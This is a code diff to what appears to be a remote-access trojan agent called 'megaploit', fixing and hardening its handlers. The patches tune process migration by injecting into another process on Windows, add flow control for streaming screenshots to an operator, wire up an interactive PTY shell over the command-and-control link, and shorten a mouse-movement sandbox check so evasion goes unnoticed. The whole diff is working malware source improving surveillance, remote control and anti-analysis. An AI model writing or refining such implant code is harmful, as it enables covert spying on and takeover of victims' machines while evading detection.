@@ -42,7 +42,7 @@ import types
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from megaploit.agent.handlers import _register, _shell_exec, get_send_lock, _handlers_lock  # shared registry
-from megaploit.core.protocol import send_msg as _send_msg, send_file as _send_file
+from megaploit.core.protocol import send_msg as _send_msg, send_file as _send_file, recv_msg as _recv_msg
 
 
 # ---------------------------------------------------------------------------
@@ -145,7 +145,11 @@ def _migrate_windows(pid: int) -> str:
             import logging as _log
             _log.getLogger(__name__).debug("migrate PyRun_SimpleString skipped: %s", _inner_exc)
 
-        # Fallback: spawn detached python.exe re-running the agent
+        # Fallback: spawn detached python.exe re-running the agent.
+        # Free the remote memory allocation before closing the process handle
+        # to avoid leaking virtual memory in the target process (H10 fix).
+        MEM_RELEASE = 0x8000
+        k32.VirtualFreeEx(h_proc, remote_mem, 0, MEM_RELEASE)
         k32.CloseHandle(h_proc)
         agent_py = os.path.abspath(sys.argv[0]) if sys.argv else ""
         if not os.path.isfile(agent_py):
@@ -495,12 +499,39 @@ def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
     fps     = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5
     delay   = 1.0 / max(1, fps)
 
+    # H6: limit how many unacknowledged frames can be queued.
+    # The operator side sends "STREAM_ACK" after consuming each frame; if the
+    # ack does not arrive within one frame-period we skip the next capture
+    # cycle rather than buffering indefinitely.
+    _MAX_UNACKED = 4
+
+    def _send_frame(b64: str, unacked: list) -> bool:
+        """Send a FRAME message and drain any pending STREAM_ACK replies.
+        Returns False if the connection appears stalled (too many unacked)."""
+        with get_send_lock():
+            _send_msg(conn, f"FRAME:{b64}")
+        unacked.append(1)
+        # Non-blocking drain of any ACKs already in the receive buffer
+        old_to = conn.gettimeout()
+        conn.settimeout(0.0)
+        try:
+            while unacked:
+                ack = _recv_msg(conn)
+                if ack == "STREAM_ACK":
+                    unacked.pop()
+        except (socket.timeout, OSError):
+            pass
+        finally:
+            conn.settimeout(old_to)
+        return len(unacked) < _MAX_UNACKED
+
     try:
         import cv2
         import mss
         import numpy as np
 
         quality = 70
+        unacked: list = []
         with mss.MSS() as sct:
             monitor = sct.monitors[1]
             for i in range(count):
@@ -512,8 +543,10 @@ def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
                                        [cv2.IMWRITE_JPEG_QUALITY, quality])
                 if ok:
                     b64 = base64.b64encode(buf.tobytes()).decode()
-                    with get_send_lock():
-                        _send_msg(conn, f"FRAME:{b64}")
+                    if not _send_frame(b64, unacked):
+                        # Back-pressure: skip this frame, wait one full delay
+                        time.sleep(delay)
+                        continue
                 elapsed = time.monotonic() - t0
                 sleep_t = delay - elapsed
                 if sleep_t > 0:
@@ -528,14 +561,16 @@ def _screenshot_stream_burst(conn, args: list[str]) -> str | None:
             import pyautogui
             from PIL import Image
             quality = 70
+            unacked: list = []
             for i in range(count):
                 t0  = time.monotonic()
                 img = pyautogui.screenshot()
                 buf = io.BytesIO()
                 img.save(buf, format="JPEG", quality=quality)
                 b64 = base64.b64encode(buf.getvalue()).decode()
-                with get_send_lock():
-                    _send_msg(conn, f"FRAME:{b64}")
+                if not _send_frame(b64, unacked):
+                    time.sleep(delay)
+                    continue
                 elapsed = time.monotonic() - t0
                 sleep_t = delay - elapsed
                 if sleep_t > 0:
@@ -600,7 +635,7 @@ def _pty_unix(conn) -> str:
 
             # Read from operator → write to PTY
             try:
-                msg = __import__("megaploit.core.protocol", fromlist=["recv_msg"]).recv_msg(conn)
+                msg = _recv_msg(conn)
                 if msg == "PTY_EXIT":
                     break
                 if isinstance(msg, str) and msg.startswith("PTY_IN:"):
@@ -697,7 +732,8 @@ def _whoami(conn, args: list[str]) -> str:
             import ctypes
             is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
             priv = "Administrator" if is_admin else "User"
-        except Exception:
+        except OSError:
+            # IsUserAnAdmin can raise OSError on very locked-down systems
             priv = "unknown"
         return f"{platform.node()}\\{user}  [{priv}]"
     else:
@@ -867,24 +903,25 @@ def _sandbox_check(conn, args: list[str]) -> str:
         except Exception as e:
             results.append(f"  Debugger     : error ({e})")
 
-    # Mouse activity (Windows)
+    # Mouse activity (Windows): sample over 1 s instead of 5 s so the command
+    # does not block the C2 channel for an operator-visible 5-second pause.
+    # A sandbox would also show no movement over 1 s (M15 fix).
     if sys.platform == "win32":
         try:
             import ctypes as _ct
-            import time as _t
 
             class _POINT(_ct.Structure):
                 _fields_ = [("x", _ct.c_long), ("y", _ct.c_long)]
 
             p1 = _POINT()
             _ct.windll.user32.GetCursorPos(_ct.byref(p1))
-            _t.sleep(5)
+            time.sleep(1)
             p2 = _POINT()
             _ct.windll.user32.GetCursorPos(_ct.byref(p2))
             moved = (p1.x != p2.x or p1.y != p2.y)
             flag  = "" if moved else " ⚠ no mouse movement (possible sandbox)"
             results.append(f"  Mouse moved  : {'yes' if moved else 'no'}{flag}")
-        except Exception as e:
+        except OSError as e:
             results.append(f"  Mouse moved  : error ({e})")
 
     header = "[*] Sandbox detection report:"
